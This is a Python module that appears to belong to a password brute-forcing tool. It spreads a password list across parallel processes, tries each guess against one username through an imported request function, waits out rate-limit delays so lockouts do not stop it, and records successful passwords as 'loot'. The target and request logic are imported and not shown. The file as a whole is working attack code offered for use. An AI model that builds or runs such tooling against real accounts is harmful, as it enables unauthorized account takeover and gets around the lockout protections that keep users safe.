#!/usr/bin/env python3
from main import *

# Thread Handler:
#   tid     (thread id)
#   ts      (timestamp)
#   ls      (pswd list)
#   slock   (shared lock between all processes)
#
#   shared dict:
#       DELAY - Time when threads may start again
#       LOOT  - Incase of hit, pwd is stored 
def handler(id, ts, ls, mlock, mdict):
    if 'DELAY' not in mdict.keys() and 'LOOT' not in mdict.keys() : mdict['DELAY'] = datetime.now(); mdict['LOOT'] = []
    i = 0
    while 1:
        throw = PAYLOAD_SIZE
        if datetime.now() > ts and len(ls):
            if mdict['DELAY'] > datetime.now():
                fdelay = mdict['DELAY'].strftime("%H:%M:%S")
                logging.info(f"\t[!] Next payload at {fdelay}\n")
                time = mdict['DELAY']-datetime.now()
                sleep(time.total_seconds())
            if len(ls) < throw:
                throw = len(ls)
            with mlock:
                random.shuffle(ls)
                with requests.Session() as s:
                    while throw:
                        pwd = ls.pop()
                        err, delta = req(s, pwd)
                        if err == None:
                            mdict['LOOT'].append(pwd)
                            return
                        mdict['DELAY'] = datetime.now() + timedelta(seconds=delta)
                        if mdict['DELAY'] > datetime.now():
                            ls.insert(0, pwd)
                        else:
                            i += 1
                        throw -= 1
                    logging.info(f"\tT{id} status: {i}/{len(ls)}\n")
        else:
            return

ALPHA = 20  # secs (thead start time increment)
def pool():
    import multiprocessing as mp
    from multiprocessing import Manager

    with Manager() as manager:
        mlock = manager.Lock()
        mdict = manager.dict()

        now = datetime.now()
        strfnow = now.strftime("%H:%M:%S")
        logging.info(f"\tStart time: {strfnow}")
        jobs = []
        ls = fsconcat()
        idxs = len(ls) // mp.cpu_count()

        i = 0
        delta = 0
        while i <= len(ls):
            tp = i + idxs
            if tp > len(ls) : tp = len(ls)
            start = gen_timestamp(now, delta)
            cut = ls[i:tp]
            logging.info(f"\tT{tp} start time: {start}")
            p = mp.Process(target=handler, args=(tp, start, cut, mlock, mdict,  ))
            jobs.append(p)
            p.start()
            i += idxs
            delta += ALPHA

        print("\n\t\t-----\n")
        for p in jobs:
            p.join()

        loot = mdict['LOOT']
        if len(loot):
            logging.info("\n\tLoot:\n")
            for pwd in loot:
                logging.info(f"\t\t {args.username}/{pwd}")